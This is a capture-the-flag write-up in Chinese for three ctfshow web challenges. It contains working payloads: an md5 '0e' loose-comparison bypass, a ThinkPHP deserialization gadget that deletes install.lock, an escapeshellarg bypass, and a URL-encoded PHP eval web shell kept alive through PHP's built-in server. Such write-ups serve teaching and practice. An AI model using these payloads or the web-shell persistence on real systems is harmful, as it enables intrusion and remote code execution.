+++
title = "ctfshow月饼杯II"
slug = "ctfshow-mooncake-cup-2"
description = "全网第一个发wp的"
date = "2024-09-06T13:56:39"
lastmod = "2024-09-06T13:56:39"
image = ""
license = ""
categories = ["ctfshow"]
tags = ["php"]
+++

# web签到

一个签到

```php
<?php
//Author:H3h3QAQ
include "flag.php";
highlight_file(__FILE__);
error_reporting(0);
if (isset($_GET["YBB"])) {
    if (hash("md5", $_GET["YBB"]) == $_GET["YBB"]) {
        echo "小伙子不错嘛！！flag给你了：" . $flag;
    } else {
        echo "偶吼，带黑阔被窝抓到了！！！！";
    }
}
```

直接找一个md5的值也是0e开头的就可以了

```
?YBB=0e215962017
```

# eztp

```php
<?php
namespace app\index\controller;
class Index
{   
    public function index($run=[])
    {
        highlight_file(__FILE__);
        echo '<h1>Welcome to CTFSHOW</h1></br>';
        echo 'Powered by PHPthink5.0.2</br>';
        echo dirname(__FILE__);

    if (!empty($run[2])){
            echo 'ZmxhZyBpcyBub3QgaGVyZSBidXQgaXQgaXMgaW4gZmxhZy50eHQ=';
        }
    if (!empty($run[1])){
            unserialize($run[1]);
        }
    }
    // hint:/index/index/backdoor
    public function backdoor(){
        if (!file_exists(dirname(__FILE__).'/../../'."install.lock")){
        echo "Try to post CMD arguments".'<br/>';
            $data = input('post.');
            if (!preg_match('/flag/i',$data['cmd'])){
                $cmd = escapeshellarg($data['cmd']);
        $cmd='cat '.$cmd;
        echo $cmd;
                system($cmd);
            }else{
                echo "No No No";
            }

        }else{
        echo dirname(__FILE__).'/../../'."install.lock has not been deleted";
    }
    }
}
Welcome to CTFSHOW

Powered by PHPthink5.0.2
/var/www/html/application/index/controller
```

首先解码base64知道

```
ZmxhZyBpcyBub3QgaGVyZSBidXQgaXQgaXMgaW4gZmxhZy50eHQ=

flag is not here but it is in flag.txt
```

要删除一个文件，tp5.1的文件删除漏洞

```php
<?php
namespace think\process\pipes;
use think\Process;
class Pipes{}
class Windows extends Pipes{
    private $files=[];
    function __construct(){
        $this->files=['/var/www/html/application/index/controller/../../install.lock'];
    }
}
echo urlencode(serialize(new Windows()));
```

传参

```
/index.php/index/index?run[1]=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A61%3A%22%2Fvar%2Fwww%2Fhtml%2Fapplication%2Findex%2Fcontroller%2F..%2F..%2Finstall.lock%22%3B%7D%7D
```

然后访问`/index.php/index/index/backdoor`

传参绕过`escapeshellarg`这里只要在中间插入一个中文字符即可

```
POST:
cmd=/fl%99ag
```

# 不要离开我

```php
<?php

// 题目说明：
// 想办法维持权限，确定无误后提交check，通过check后，才会生成flag，此前flag不存在

error_reporting(0);
highlight_file(__FILE__);

$a=$_GET['action'];

switch($a){
    case 'cmd':
        eval($_POST['cmd']);
        break;
    case 'check':
        file_get_contents("http://checker/api/check");
        break;
    default:
        die('params not validate');
}
```

这里测试了一下`check`之后`web`服务会关掉

我们先写入`shell`(覆盖index.php)然后生成`flag`再利用内置web服务

```
cmd=file_put_contents("/tmp/index.php","<?php eval(\$_POST['a']);?>");
编码一下
cmd=%66%69%6c%65%5f%70%75%74%5f%63%6f%6e%74%65%6e%74%73%28%22%2f%74%6d%70%2f%69%6e%64%65%78%2e%70%68%70%22%2c%22%3c%3f%70%68%70%20%65%76%61%6c%28%5c%24%5f%50%4f%53%54%5b%27%61%27%5d%29%3b%3f%3e%22%29%3b
```

再利用shell进行RCE

```
cmd=system("cat /tmp/index.php");
看看写入没有
```

[内置web server](https://www.php.net/manual/zh/features.commandline.webserver.php)

```
cmd=system("sleep 10 && php -S 0.0.0.0:80 -t /tmp/");

cmd=%73%79%73%74%65%6d%28%22%73%6c%65%65%70%20%31%30%20%26%26%20%70%68%70%20%2d%53%20%30%2e%30%2e%30%2e%30%3a%38%30%20%2d%74%20%2f%74%6d%70%2f%22%29%3b%0a
```

然后10s中之内check一下，马上退出来，在重新进入就可以`getshell`了

